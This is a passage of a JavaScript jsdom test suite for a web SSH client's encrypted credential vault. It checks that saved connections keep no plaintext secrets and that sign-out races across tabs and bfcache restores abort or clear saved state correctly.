  $(win, 'iH').value = 'prod.ex'; $(win, 'iU').value = 'deploy';
  $(win, 'iPw').value = 'new-pw'; $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'Prod';
  win.doConnect();
  await sleep(120);
  let p2 = paneList(win)[0];
  p2.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p2, {data: '', alive: true});
  // commitVaultSave runs the new local write synchronously after the
  // POST resolves; the fire-and-forget _bulkDeleteVaultEntry kicks off
  // in the same tick. Give the IDB resolve + fetch a moment to land.
  await sleep(120);
  ok(saveBodies.length === 2, 'second /api/save POSTed; got ' + saveBodies.length);
  const secondConnId = saveBodies[1].conn_id;
  ok(/^[A-Z2-7]{26}$/.test(secondConnId), 'second conn_id well-formed; got ' + secondConnId);
  ok(secondConnId !== firstConnId, 'second conn_id differs from first');
  // Exactly one save_delete, against the FIRST conn_id (not the new one),
  // carrying the right vault_id.
  ok(deleteUrls.length === 1,
     'exactly one save_delete fired after re-save; got ' + deleteUrls.length +
     ' (' + JSON.stringify(deleteUrls) + ')');
  const reapUrl = deleteUrls[0];
  ok(reapUrl.indexOf('conn_id=' + firstConnId) !== -1,
     'save_delete carried the OLD conn_id; url=' + reapUrl);
  ok(reapUrl.indexOf('conn_id=' + secondConnId) === -1,
     'save_delete did NOT carry the new conn_id; url=' + reapUrl);
  ok(reapUrl.indexOf('vault_id=' + realVaultId) !== -1,
     'save_delete carried the vault_id; url=' + reapUrl);
  // localStorage: exactly one "Prod" row, carrying the new conn_id.
  const list = JSON.parse(win.localStorage.getItem('websh_connections') || '[]');
  const prodRows = list.filter(c => c.name === 'Prod');
  ok(prodRows.length === 1,
     'exactly one Prod row in localStorage; got ' + prodRows.length +
     ' (' + JSON.stringify(list) + ')');
  ok(prodRows[0].conn_id === secondConnId,
     'surviving Prod row carries the NEW conn_id; got ' + prodRows[0].conn_id);
  cleanup(env);
});

// =====================================================================
// Vault: saved-card list new shape (no secrets in localStorage)
// =====================================================================

test('saved list: new-shape entry renders without secrets in DOM', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Prod', conn_id: 'A'.repeat(26), host: 'p.example.com',
     port: 22, user: 'deploy', auth: 'pw', persistent: true}]));
  win.eval('renderSaved()');
  const rows = win.document.querySelectorAll('.sv');
  ok(rows.length === 1, 'one row rendered');
  ok(rows[0].querySelector('.sv-name').textContent === 'Prod', 'name shown');
  ok(rows[0].textContent.indexOf('deploy@p.example.com:22') !== -1,
     'host line shown without (key) suffix for auth=pw');
  ok(rows[0].textContent.indexOf('(key)') === -1,
     'auth=pw entry does not show (key) badge');
  ok(rows[0].textContent.indexOf('password') === -1,
     'no "password" string anywhere in the row');
  cleanup(env);
});

test('saved list: auth=key new-shape entry shows (key) badge', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Bastion', conn_id: 'B'.repeat(26), host: 'b.example.com',
     port: 2222, user: 'root', auth: 'key', persistent: false}]));
  win.eval('renderSaved()');
  const row = win.document.querySelector('.sv');
  ok(row.textContent.indexOf('(key)') !== -1, '(key) badge shown for auth=key');
  ok(row.textContent.indexOf('2222') !== -1, 'port surfaced');
  cleanup(env);
});

test('saved list: legacy entry with c.key truthy keeps (key) badge', async () => {
  // Backward-compat: pre-vault rows have c.key holding an SSH private
  // key blob (no auth tag). In a fresh page load _maybeAutoDropLegacy
  // would strip c.key before the first render — this test bypasses
  // that by calling renderSaved directly on freshly-seeded legacy
  // data so the (key) badge logic itself is exercised.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OldKey', host: 'k.example.com', port: 22, user: 'u',
     key: '-----BEGIN OPENSSH PRIVATE KEY-----\nABC\n-----END OPENSSH PRIVATE KEY-----'}]));
  win.eval('renderSaved()');
  const row = win.document.querySelector('.sv');
  ok(row.textContent.indexOf('(key)') !== -1, 'legacy c.key truthy still shows (key)');
  cleanup(env);
});

// =====================================================================
// Vault: vault_enabled gate (Save UI hides when server reports off)
// =====================================================================

test('vault gate: vault_enabled=true exposes Save UI', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  ok(win.document.documentElement.classList.contains('vault-on'),
     '<html>.vault-on set after /api/config');
  ok(!win.document.documentElement.classList.contains('vault-off'),
     '<html>.vault-off cleared');
  // The label is the rendered, focusable element; either parent (save-row)
  // having .vault-only is the contract that hides the row in CSS.
  const saveRow = $(win, 'iSave').closest('.save-row');
  ok(saveRow && saveRow.classList.contains('vault-only'),
     'iSave save-row carries vault-only marker');
  cleanup(env);
});

test('vault gate: vault_enabled=false hides Save UI', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: false}}];
  const env = await mkEnv(plan); const win = env.win;
  ok(win.document.documentElement.classList.contains('vault-off'),
     '<html>.vault-off set');
  ok(!win.document.documentElement.classList.contains('vault-on'),
     '<html>.vault-on cleared');
  // jsdom doesn't compute CSS, so we assert the class invariant the CSS
  // depends on rather than getComputedStyle.
  const saveRow = $(win, 'iSave').closest('.save-row');
  ok(saveRow && saveRow.classList.contains('vault-only'),
     'iSave save-row still has vault-only marker (CSS handles visibility)');
  cleanup(env);
});

test('vault gate: omitted vault_enabled treated as false', async () => {
  // Older server (or unset) responds without the field — must not show
  // the Save affordance.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: []}}];
  const env = await mkEnv(plan); const win = env.win;
  ok(win.document.documentElement.classList.contains('vault-off'),
     'missing vault_enabled defaults to vault-off');
  cleanup(env);
});

// =====================================================================
// PR-67 review fixes — regression tests for gorevds's findings.
// =====================================================================

test('F4: sign-out flag set mid-2.5s-window aborts commitVaultSave', async () => {
  // Reproduces: user clicks Connect+Save, the 2.5 s stable window opens,
  // a sibling tab broadcasts signed_out (_vaultRecentlySignedOut := true),
  // commit fires. We must NOT POST a server-side blob whose key was
  // just wiped from disk.
  let saveCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-f4', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: () => { saveCalls++; return {}; }, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.5'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'F4-card';
  win.doConnect();
  await sleep(120);
  const ps = paneList(win);
  ok(ps.length === 1, 'pane materialized; got ' + ps.length);
  const p = ps[0];
  // Sign-out from a sibling tab lands between connect-success and the
  // stable-window tick. The flag is the documented signal.
  win._vaultRecentlySignedOut = true;
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(80);
  ok(saveCalls === 0, 'commitVaultSave bailed; got saveCalls=' + saveCalls);
  const list = JSON.parse(win.localStorage.getItem('websh_connections') || '[]');
  ok(list.length === 0, 'no card written to localStorage; got ' + list.length);
  cleanup(env);
});

test('F4: explicit save click after sign-out clears the flag and proceeds', async () => {
  // Symmetric to the above: the user signs out, then explicitly clicks
  // Save+Connect on a new credential. doConnect's intent supersedes the
  // past sign-out, the flag clears, and the save lands normally.
  let saveBody = null;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-f4b', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: (b) => { saveBody = b; return {}; }, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  win._vaultRecentlySignedOut = true;  // simulate prior sign-out
  $(win, 'iH').value = '10.0.0.6'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p2';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'F4b-card';
  win.doConnect();
  await sleep(20);
  ok(win._vaultRecentlySignedOut === false,
     'doConnect cleared the flag at save initiation');
  const ps = paneList(win);
  ok(ps.length === 1, 'pane materialized; got ' + ps.length);
  const p = ps[0];
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(80);
  ok(saveBody && saveBody.host === '10.0.0.6', 'save POSTed normally');
  cleanup(env);
});

test('F7: /api/save body carries ssh_options={}', async () => {
  // The server expects (and filters) ssh_options on every save. The
  // browser has no UI for arbitrary SSH options yet, but sending an
  // empty object keeps the wire shape coherent and the server-side
  // filter exercised.
  let saveBody = null;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-f7', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: (b) => { saveBody = b; return {}; }, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.7'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'F7-card';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(80);
  ok(saveBody && 'ssh_options' in saveBody, 'ssh_options present on save body');
  ok(typeof saveBody.ssh_options === 'object' &&
     saveBody.ssh_options !== null &&
     !Array.isArray(saveBody.ssh_options) &&
     Object.keys(saveBody.ssh_options).length === 0,
     'ssh_options is an empty object; got ' + JSON.stringify(saveBody.ssh_options));
  cleanup(env);
});

test('F2: __ephemeralSecrets is non-enumerable + scrubbed after save', async () => {
  // Plaintext password lives in a non-enumerable property so a future
  // accidental JSON.stringify / debug-log can't spill it. After the
  // POST resolves we null the secret fields in the closure (best-effort
  // — strings are immutable in JS, this only drops references).
  let saveBody = null;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-f2', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: (b) => { saveBody = b; return {}; }, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.8'; $(win, 'iU').value = 'a';
  $(win, 'iPw').value = 'super-secret-pw';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'F2-card';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  // Spot-check that JSON.stringify on pendingSave does not include the
  // password — non-enumerability guarantees this.
  ok(!JSON.stringify(p.pendingSave).includes('super-secret-pw'),
     'JSON.stringify(pendingSave) does NOT contain plaintext password');
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(80);
  ok(saveBody, '/api/save POSTed');
  // The bag itself is preserved on the original (Object.assign + carry
  // helper at finalizeSuccess hop), but the secret references are
  // nulled in commitVaultSave's finally.
  // We check it indirectly: walking JSON.stringify on the entry stored
  // in localStorage must not contain the password.
  const ls = win.localStorage.getItem('websh_connections') || '[]';
  ok(!ls.includes('super-secret-pw'),
     'localStorage saved-card list does NOT contain plaintext password');
  cleanup(env);
});

test('F2: hideOverlay scrubs iPw / iKey / iKeyPw / iName', async () => {
  // After a successful connect, hideOverlay should leave the form
  // fields empty so a later devtools paste / extension content-script
  // can't lift the credentials out of the DOM.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-scrub', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h.example.com'; $(win, 'iU').value = 'u';
  $(win, 'iPw').value = 'leaky-pw';
  $(win, 'iKeyPw').value = 'leaky-keypw';
  $(win, 'iName').value = 'my-name';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(120);
  ok($(win, 'iPw').value === '', 'iPw cleared');
  ok($(win, 'iKey').value === '', 'iKey cleared');
  ok($(win, 'iKeyPw').value === '', 'iKeyPw cleared');
  ok($(win, 'iName').value === '', 'iName cleared');
  cleanup(env);
});

test('F3: connectSaved click with throwing exportKey bails before /api/connect', async () => {
  // Web Crypto's exportKey can throw on a corrupt CryptoKey / OOM.
  // connectSaved (the .sv click path) wraps the call so the failure
  // surfaces a toast instead of an unhandled rejection that leaves
  // the click in an indeterminate state with no UI feedback.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-f3', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  await _seedVaultCard(win);
  // Sabotage Web Crypto's exportKey to throw. _injectVaultGlobals wires
  // win.crypto.subtle to the shared nodeCrypto.webcrypto.subtle object,
  // so we must restore on the way out or every subsequent test that
  // calls exportKey breaks (including _seedVaultCard for the next
  // saved-variant test).
  const realExportKey = win.crypto.subtle.exportKey.bind(win.crypto.subtle);
  win.crypto.subtle.exportKey = async () => { throw new Error('simulated crypto failure'); };
  try {
    win.document.querySelector('.sv').click();
    await sleep(100);
    const ps = paneList(win);
    // Either the click bailed before runConnect (no pane at all), or a
    // pane exists with connecting=false. Both are acceptable end states;
    // an indeterminate connecting=true would be the regression.
    if (ps.length) {
      ok(ps[0].connecting === false, 'no pane left in connecting state');
    } else {
      ok(true, 'no pane materialised (early bail OK)');
    }
  } finally {
    win.crypto.subtle.exportKey = realExportKey;
  }
  cleanup(env);
});

test('F5: showToast dedups identical messages', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.showToast('hello world', 'warn');
  win.showToast('hello world', 'warn');
  win.showToast('hello world', 'warn');
  const toasts = win.document.querySelectorAll('#toastHost .toast');
  ok(toasts.length === 1, 'three identical showToast calls yield one toast; got ' + toasts.length);
  // A different message/kind is not deduped.
  win.showToast('something else', 'err');
  const after = win.document.querySelectorAll('#toastHost .toast');
  ok(after.length === 2, 'distinct message stacks; got ' + after.length);
  // Error toast carries role=alert.
  const err = win.document.querySelector('#toastHost .toast.err');
  ok(err && err.getAttribute('role') === 'alert',
     'error toast has role=alert; got role=' + (err && err.getAttribute('role')));
  cleanup(env);
});

test('F5: showToast click-to-dismiss removes the toast', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.showToast('dismissable', '');
  let toasts = win.document.querySelectorAll('#toastHost .toast');
  ok(toasts.length === 1, 'toast shown');
  toasts[0].click();
  // 250 ms transition before removal.
  await sleep(280);
  toasts = win.document.querySelectorAll('#toastHost .toast');
  ok(toasts.length === 0, 'toast removed after click; got ' + toasts.length);
  cleanup(env);
});

test('F9: signOutModal carries dialog a11y attributes', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const modal = $(win, 'signOutModal');
  ok(modal.getAttribute('role') === 'dialog', 'role=dialog');
  ok(modal.getAttribute('aria-modal') === 'true', 'aria-modal=true');
  const labelledBy = modal.getAttribute('aria-labelledby');
  ok(labelledBy === 'signOutTitle', 'aria-labelledby=signOutTitle; got ' + labelledBy);
  const titleEl = $(win, 'signOutTitle');
  ok(titleEl && titleEl.tagName === 'H2', 'title element has matching id');
  cleanup(env);
});

test('F9: openSignOutModal populates scope count + names', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  // Seed two saved cards.
  await win.eval('ensureVaultId()');
  await win.eval('ensureVaultKey()');
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Alpha', conn_id: 'A'.repeat(26), host: 'a', port: 22,
     user: 'u', auth: 'pw', persistent: false},
    {name: 'Beta', conn_id: 'B'.repeat(26), host: 'b', port: 22,
     user: 'u', auth: 'pw', persistent: false},
  ]));
  win.openSignOutModal();
  const scope = $(win, 'signOutScope').textContent;
  ok(scope.includes('2 saved cards'), 'count rendered; got "' + scope + '"');
  ok(scope.includes('Alpha') && scope.includes('Beta'), 'names rendered; got "' + scope + '"');
  win.closeSignOutModal();
  cleanup(env);
});

test('F9: openSignOutModal scope copy with zero vault cards', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.openSignOutModal();
  const scope = $(win, 'signOutScope').textContent;
  ok(scope.includes('No vault-backed cards'),
     'zero-card scope copy shown; got "' + scope + '"');
  win.closeSignOutModal();
  cleanup(env);
});

test('bfcache: pagehide closes BroadcastChannel; pageshow(persisted=true) re-opens it', async () => {
  // The reviewer's concern: Safari bfcache + an alive BroadcastChannel
  // could replay queued messages into a frozen tab. The fix closes on
  // pagehide and re-inits on pageshow when persisted=true so multi-tab
  // sign-out sync keeps working after Back-navigation.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  // Mock BroadcastChannel so we can observe close() + re-construction.
  let constructed = 0, closed = 0;
  const ChannelMock = class {
    constructor(name) {
      this.name = name; constructed++; this.onmessage = null;
      ChannelMock.instances.push(this);
    }
    postMessage() {}
    close() { closed++; }
  };
  ChannelMock.instances = [];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/websh/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(30);
  // _initVaultBroadcast runs at module load → first channel.
  ok(constructed === 1, 'channel constructed at boot; got ' + constructed);
  // Fire pagehide → channel.close() must run.
  win.dispatchEvent(new win.Event('pagehide'));
  ok(closed === 1, 'channel closed on pagehide; got ' + closed);
  // Fire pageshow with persisted=true → channel must be re-constructed.
  const ev = new win.Event('pageshow');
  Object.defineProperty(ev, 'persisted', {value: true});
  win.dispatchEvent(ev);
  ok(constructed === 2, 'channel re-constructed after bfcache restore; got ' + constructed);
  // pageshow with persisted=false (cold load) must NOT mint another channel.
  const ev2 = new win.Event('pageshow');
  Object.defineProperty(ev2, 'persisted', {value: false});
  win.dispatchEvent(ev2);
  ok(constructed === 2, 'cold-load pageshow does NOT re-init; got ' + constructed);
  await closeDom(dom);
});

test('vault BroadcastChannel name is path-scoped under isolate_storage', async () => {
  // Two tabs under isolate_storage at different URL paths must not
  // share a vault BroadcastChannel — a sign-out on one path would
  // otherwise tear down vault panes belonging to the other path's
  // tenant. Module-init opens with empty storagePrefix; loadServerConfig
  // re-inits once isolate_storage is known.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true,
                                                isolate_storage: true}}];
  const names = [];
  const ChannelMock = class {
    constructor(name) { this.name = name; names.push(name); this.onmessage = null; }
    postMessage() {}
    close() {}
  };
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/team-a/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(40);
  // First open at module init (storagePrefix=''), then re-open after
  // loadServerConfig resolves the path. Name shape is prefix+'websh_vault'
  // (matches storageKey() convention).
  ok(names[0] === 'websh_vault',
     'module-init opens with empty prefix; got ' + JSON.stringify(names[0]));
  ok(names[names.length - 1] === '/team-a/websh_vault',
     'final open is path-scoped to /team-a/; got ' +
     JSON.stringify(names[names.length - 1]));
  await closeDom(dom);
});

test('sibling tab on a different path does NOT trigger sign-out handler', async () => {
  // Cross-path sign-out: under isolate_storage, a signed_out from
  // /team-b/ must NOT reach /team-a/. Real BroadcastChannel filters by
  // name; the mock below honours that (the other tests in this file
  // use a permissive mock that broadcasts to every instance — fine
  // for same-channel scenarios but wrong for this test).
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true,
                                                isolate_storage: true}}];
  const ChannelMock = class {
    constructor(name) {
      this.name = name; this.onmessage = null;
      ChannelMock.instances.push(this);
    }
    postMessage(d) {
      ChannelMock.instances.forEach(c => {
        if (c !== this && c.name === this.name && c.onmessage)
          c.onmessage({data: d});
      });
    }
    close() {
      ChannelMock.instances = ChannelMock.instances.filter(c => c !== this);
    }
  };
  ChannelMock.instances = [];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/team-a/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(40);
  // Populate vault caches so we can observe (non-)invalidation.
  await win.eval('ensureVaultId()');
  await win.eval('ensureVaultKey()');
  ok(win.eval('_idbHasKeyCache') === true, 'cache hot pre-test');
  ok(win.eval('_vaultRecentlySignedOut') === false, 'flag clear pre-test');
  // Sibling on a DIFFERENT path fires signed_out.
  const otherTab = new ChannelMock('/team-b/websh_vault');
  otherTab.postMessage({type: 'signed_out'});
  await sleep(40);
  // Our caches are untouched — the cross-path broadcast didn't reach us.
  ok(win.eval('_idbHasKeyCache') === true,
     'cache NOT invalidated by cross-path broadcast');
  ok(win.eval('_vaultRecentlySignedOut') === false,
     'sign-out flag NOT set by cross-path broadcast');
  // Same-path sibling DOES reach us — sanity check that scoping is the
  // discriminator, not a global block on cross-channel messages.
  const samePath = new ChannelMock('/team-a/websh_vault');
  samePath.postMessage({type: 'signed_out'});
  await sleep(40);
  ok(win.eval('_vaultRecentlySignedOut') === true,
     'same-path sibling DOES set the sign-out flag');
  await closeDom(dom);
});

test('F1: post-encrypt vault_id race (sign-out between subtle.encrypt and POST) aborts save', async () => {
  // The actual race the post-encrypt re-check was added for: sign-out
  // lands AFTER the pre-encrypt flag check has cleared but DURING the
  // subtle.encrypt yield, so by the time commitVaultSave returns from
  // encrypt, IDB has a fresh vault_id (or is empty). The existing F4
  // test only exercises the synchronous pre-encrypt bail; reverting
  // the post-encrypt branch passed every other test in the suite. This
  // test wraps subtle.encrypt so we can interleave an IDB wipe right
  // when the ciphertext resolves — _vaultRecentlySignedOut stays false
  // throughout, forcing the IDB-mismatch arm of the check.
  let saveCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-f1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: () => { saveCalls++; return {}; }, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Wrap subtle.encrypt: after the real call resolves, simulate a
  // sibling-tab signed_out by wiping IDB. We do NOT set the
  // _vaultRecentlySignedOut flag — the post-encrypt branch must catch
  // this via the IDB re-read alone.
  const realEncrypt = win.crypto.subtle.encrypt.bind(win.crypto.subtle);
  let racePulled = false;
  Object.defineProperty(win.crypto.subtle, 'encrypt', {
    value: async function(...args) {
      const ct = await realEncrypt(...args);
      if (!racePulled) {
        racePulled = true;
        // Wipe IDB. Mirrors what confirmSignOut does on the sibling.
        await win.eval('_idbDelete("vault_id")');
        await win.eval('_idbDelete("K")');
      }
      return ct;
    },
    configurable: true, writable: true,
  });
  $(win, 'iH').value = '10.0.0.9'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'F1-card';
  win.doConnect();
  await sleep(120);
  const ps = paneList(win);
  ok(ps.length === 1, 'pane materialized; got ' + ps.length);
  const p = ps[0];
  // Flag stays false through pre-encrypt; the IDB wipe happens during
  // the subtle.encrypt yield triggered by commitVaultSave.
  ok(win._vaultRecentlySignedOut === false,
     'pre-encrypt flag stays false (test exercises IDB-mismatch arm)');
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(120);
  ok(racePulled, 'subtle.encrypt wrapper actually fired (sanity)');
  ok(saveCalls === 0,
     'post-encrypt IDB re-read aborted POST; got saveCalls=' + saveCalls);
  const list = JSON.parse(win.localStorage.getItem('websh_connections') || '[]');
  ok(list.length === 0,
     'no card written to localStorage after post-encrypt race; got ' + list.length);
  cleanup(env);
});

test('commitVaultSave: post-POST sign-out aborts local list write', async () => {
  // Sibling tab signs out DURING the /api/save round-trip — the POST
  // itself lands (server orphans the blob; we accept that), but the
  // local list write would otherwise zombify the entry into the
  // sign-out-wiped localStorage. The pre-encrypt and post-encrypt
  // windows are already guarded; this test covers the post-POST gap.
  let saveCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-pp', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: function() {
      saveCalls++;
      // Pretend a sibling tab signed out while the POST was in flight.
      // Setting the flag synchronously here makes the post-POST IDB
      // re-read run with the sign-out state in place. (We also wipe
      // IDB so the IDB-mismatch arm fires too; matches the real
      // multi-tab sequence.)
      return Promise.resolve()
        .then(() => win.eval('_idbDelete("vault_id")'))
        .then(() => win.eval('_idbDelete("K")'))
        .then(() => { win._vaultRecentlySignedOut = true; return {}; });
    }, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.10'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'pp-card';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  ok(p, 'pane materialized');
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(120);
  ok(saveCalls === 1, '/api/save did POST; got saveCalls=' + saveCalls);
  const list = JSON.parse(win.localStorage.getItem('websh_connections') || '[]');
  ok(list.length === 0,
     'local list write was skipped after post-POST sign-out; got ' + list.length);
  cleanup(env);
});

test('bfcache restore invalidates vault caches and re-renders saved list', async () => {
  // If a sibling tab signs out while this one is bfcache'd, the
  // _vaultKeyCache / _vaultIdCache / _idbHasKeyCache in-memory state
  // survives the freeze and would paint saved rows as connectable
  // until the next IDB touch. The pageshow(persisted=true) handler
  // must invalidate caches, re-read IDB, and re-render so the rows
  // gray out immediately. We probe the in-memory cache state through
  // ensureVaultIdIfPresent (cache-hit-first, IDB-fallback) since
  // `let`-scope vars aren't reachable via win.eval directly.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const ChannelMock = class {
    constructor(name) { this.name = name; ChannelMock.instances.push(this); this.onmessage = null; }
    postMessage() {}
    close() {}
  };
  ChannelMock.instances = [];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                                url: 'http://localhost/websh/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.BroadcastChannel = ChannelMock;
  win.localStorage.clear();
  win.eval(js + EXPOSE);
  await sleep(30);
  // Seed: vault_id + K in IDB, one saved card, caches warm.
  const {vault_id, conn_id} = await _seedVaultCard(win);
  ok(win._idbHasKeyCache === true, 'cache hot after _seedVaultCard');
  // ensureVaultIdIfPresent returns from _vaultIdCache when non-null,
  // so a positive read here proves the in-memory cache is populated.
  const cachedBefore = await win.eval('ensureVaultIdIfPresent()');
  ok(cachedBefore === vault_id,
     '_vaultIdCache populated; got=' + cachedBefore);
  // Simulate the sibling-tab sign-out that happened while bfcache'd:
  // wipe IDB directly (the BC broadcast in the real world never
  // reaches us because our channel was closed on pagehide). In-memory
  // caches stay hot — that's the bug.
  await win.eval('_idbDelete("vault_id")');
  await win.eval('_idbDelete("K")');
  // Caches are still hot pre-restore (proving the bug exists without
  // the fix). The saved row would render as connectable.
  ok(win._idbHasKeyCache === true,
     'in-memory _idbHasKeyCache STILL hot before pageshow (pre-fix state)');
  const cachedStale = await win.eval('ensureVaultIdIfPresent()');
  ok(cachedStale === vault_id,
     '_vaultIdCache still returns stale vault_id pre-pageshow (pre-fix state)');
  // Confirm the painted DOM row also isn't yet greyed out.
  const rowsBefore = win.document.querySelectorAll('.sv');
  ok(rowsBefore.length === 1, 'saved card row present');
  ok(!rowsBefore[0].classList.contains('nokey'),
     'row not greyed out before bfcache restore (cache is stale-hot)');
  // Fire pageshow with persisted=true — must invalidate caches, re-
  // read IDB, re-render.
  const ev = new win.Event('pageshow');
  Object.defineProperty(ev, 'persisted', {value: true});
  win.dispatchEvent(ev);
  // invalidateVaultCache is synchronous; _refreshIdbHasKey is async.
  // _idbHasKeyCache resets synchronously by invalidateVaultCache.
